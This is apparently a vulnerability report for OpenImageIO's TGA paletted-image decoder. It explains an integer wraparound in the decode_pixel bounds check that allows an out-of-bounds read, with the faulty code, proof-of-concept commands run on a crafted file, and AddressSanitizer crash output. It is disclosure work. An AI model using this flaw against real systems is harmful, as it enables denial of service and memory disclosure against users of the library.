## Integer wraparound in bounds check of decode_pixel leads to out-of-bounds read in TGA paletted image decoder

The bounds check in TGAInput::decode_pixel computes `k + palbytespp` as unsigned 32-bit
arithmetic. When k = 0xFFFFFFFC and palbytespp = 4, the addition wraps to 0, which
compares less than palette_alloc_size and passes the check. The subsequent palette
access uses the unwrapped k (0xFFFFFFFC) as the index, reading ~4 GB past the
start of the palette buffer — SEGV.

Version: 3.2.0.1-dev
Commit:  c75e31faa1bc24dea923c03a51db7be78b71c660


Root cause (targainput.cpp:582-586):
```c
    unsigned int k = 0;
    ...
    k = (m_tga.cmap_first + k) * palbytespp;   // line 582: k = 0xFFFFFFFC
    if (k + palbytespp > palette_alloc_size) {  // line 583: 0xFFFFFFFC+4 wraps to 0
        errorfmt("Corrupt palette index");       //   0 > 4 -> FALSE => check passes
        return false;
    }
    // case 4:
    out[0] = palette[k + 2];  // palette[0xFFFFFFFE] → OOB read → SEGV
```

`k` and `palbytespp` are both 32-bit, so `k + palbytespp` is computed as uint32
before being widened to size_t for comparison. The wrapped zero passes the check
and execution reaches the palette array access with the original large k.

### Proof-of-concept

.tga file: poc_tga_palette_ovf.tga

```bash
  ./bin/oiiotool -hash poc_tga_palette_ovf.tga
```
or 
```bash
  ./bin/iinfo -hash poc_tga_palette_ovf.tga
```

Sanitizer output:
```bash
$ ./bin/oiiotool -hash poc_tga_palette_ovf.tga 2>&1

AddressSanitizer:DEADLYSIGNAL
=================================================================
==110568==ERROR: AddressSanitizer: SEGV on unknown address 0xea03033e894e (pc 0xede20f0e6b80 bp 0xffffc7b3b9f0 sp 0xffffc7b3b9f0 T0)
==110568==The signal is caused by a READ memory access.
    #0 0xede20f0e6b80 in OpenImageIO::v3_2_0::TGAInput::decode_pixel(unsigned char*, unsigned char*, unsigned char*, int, int, unsigned long) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x7ec6b80) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #1 0xede20f0dc8a0 in OpenImageIO::v3_2_0::TGAInput::readimg() (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x7ebc8a0) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #2 0xede20f0e1fdc in OpenImageIO::v3_2_0::TGAInput::read_native_scanline(int, int, int, int, void*) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x7ec1fdc) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #3 0xede20e102cc0 in OpenImageIO::v3_1::ImageInput::read_native_scanlines(int, int, int, int, int, void*) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x6ee2cc0) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #4 0xede20e139b14 in OpenImageIO::v3_1::ImageInput::read_native_scanlines(int, int, int, int, OpenImageIO::v3_1::span<std::byte, 18446744073709551615ul>) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x6f19b14) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #5 0xede20e153304 in OpenImageIO::v3_1::ImageInput::read_scanlines(int, int, int, int, int, int, int, OpenImageIO::v3_1::TypeDesc, void*, long, long) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x6f33304) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #6 0xede20e14908c in OpenImageIO::v3_1::ImageInput::read_image(int, int, int, int, OpenImageIO::v3_1::TypeDesc, void*, long, long, long, bool (*)(void*, float), void*) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x6f2908c) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #7 0xede20e4bb598 in OpenImageIO::v3_2_0::pvt::compute_sha1(OpenImageIO::v3_1::ImageInput*, int, int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x729b598) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f)
    #8 0xae0d780eff78 in print_info_subimage(std::ostream&, OpenImageIO::v3_2_0::OiioTool::Oiiotool&, int, int, int, OpenImageIO::v3_1::ImageSpec const&, OpenImageIO::v3_2_0::OiioTool::ImageRec*, OpenImageIO::v3_1::ImageInput*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, OpenImageIO::v3_2_0::pvt::print_info_options const&, std::__cxx11::basic_regex<char, std::__cxx11::regex_traits<char> >&, std::__cxx11::basic_regex<char, std::__cxx11::regex_traits<char> >&, OpenImageIO::v3_1::ImageSpec::SerialFormat, OpenImageIO::v3_1::ImageSpec::SerialVerbose) (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0x121ff78) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #9 0xae0d780fd480 in OpenImageIO::v3_2_0::OiioTool::print_info(std::ostream&, OpenImageIO::v3_2_0::OiioTool::Oiiotool&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, OpenImageIO::v3_2_0::pvt::print_info_options const&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&) (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0x122d480) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #10 0xae0d77e4907c in input_file(OpenImageIO::v3_2_0::OiioTool::Oiiotool&, OpenImageIO::v3_1::span<char const* const, 18446744073709551615ul>) [clone .isra.0] (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0xf7907c) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #11 0xae0d77ea5210 in std::_Function_handler<void (OpenImageIO::v3_1::ArgParse::Arg&, OpenImageIO::v3_1::span<char const* const, 18446744073709551615ul>), OpenImageIO::v3_1::ArgParse::Arg::action(std::function<void (OpenImageIO::v3_1::span<char const* const, 18446744073709551615ul>)>&&)::{lambda(OpenImageIO::v3_1::ArgParse::Arg&, OpenImageIO::v3_1::span<char const* const, 18446744073709551615ul>)#1}>::_M_invoke(std::_Any_data const&, OpenImageIO::v3_1::ArgParse::Arg&, OpenImageIO::v3_1::span<char const* const, 18446744073709551615ul>&&) (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0xfd5210) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #12 0xede205fa9cac in OpenImageIO::v3_1::ArgParse::Impl::parse_args(int, char const**) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO_Util.so.3.2.0+0xb59cac) (BuildId: 3650f1d2b564882e0c070606c1b37db90bc86625)
    #13 0xede205fb5260 in OpenImageIO::v3_1::ArgParse::parse_args(int, char const**) (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO_Util.so.3.2.0+0xb65260) (BuildId: 3650f1d2b564882e0c070606c1b37db90bc86625)
    #14 0xae0d77e6a618 in OpenImageIO::v3_2_0::OiioTool::Oiiotool::getargs(int, char**) (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0xf9a618) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #15 0xae0d77b5b250 in main (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0xc8b250) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)
    #16 0xede204852598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #17 0xede204852678 in __libc_start_main_impl ../csu/libc-start.c:360
    #18 0xae0d77b606ec in _start (/home/roo/Desktop/OpenImageIO/build/bin/oiiotool+0xc906ec) (BuildId: 26dc66bb500e400fe6af08ca81c9b6cb3d954d90)

==110568==Register values:
 x0 = 0x0000000000000006   x1 = 0x0000000000000000   x2 = 0x0000ea03033e894e   x3 = 0x0000ea02033e8950  
 x4 = 0x00000000fffffffe   x5 = 0x00001d406067d129   x6 = 0x0000000000000004   x7 = 0x0000000000000003  
 x8 = 0x0000000000000018   x9 = 0x0000eb02033e2a40  x10 = 0x0000e9e2022b9d60  x11 = 0x000000003f000000  
x12 = 0x0000000000000004  x13 = 0x0000e9e2022b9d50  x14 = 0x00001d604067c548  x15 = 0x0000ede204af2ed8  
x16 = 0x0000ede2048b3760  x17 = 0x0000ede216987d40  x18 = 0x000000003fffffff  x19 = 0x00000000fffffffc  
x20 = 0x0000ede204af2ed8  x21 = 0x00001d604067c548  x22 = 0x0000e9e2022b9d50  x23 = 0x0000000000000000  
x24 = 0xf2d634390b60be0a  x25 = 0x0000e9e2022b9d60  x26 = 0x52ed46a992bfc45a  x27 = 0x0000000000000007  
x28 = 0x9ddfea08eb382d69   fp = 0x0000ffffc7b3b9f0   lr = 0x0000ede20f0dc8a4   sp = 0x0000ffffc7b3b9f0  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/roo/Desktop/OpenImageIO/build/lib/libOpenImageIO.so.3.2.0+0x7ec6b80) (BuildId: d9a5db60d654cc4cee69dab2ea5033ad225a5a0f) in OpenImageIO::v3_2_0::TGAInput::decode_pixel(unsigned char*, unsigned char*, unsigned char*, int, int, unsigned long)
==110568==ABORTING
```


Impact:
  - Immediate:  DoS — unconditional crash on any crafted TYPE_PALETTED TGA file with bpp=32
  - Potential:  OOB read primitive
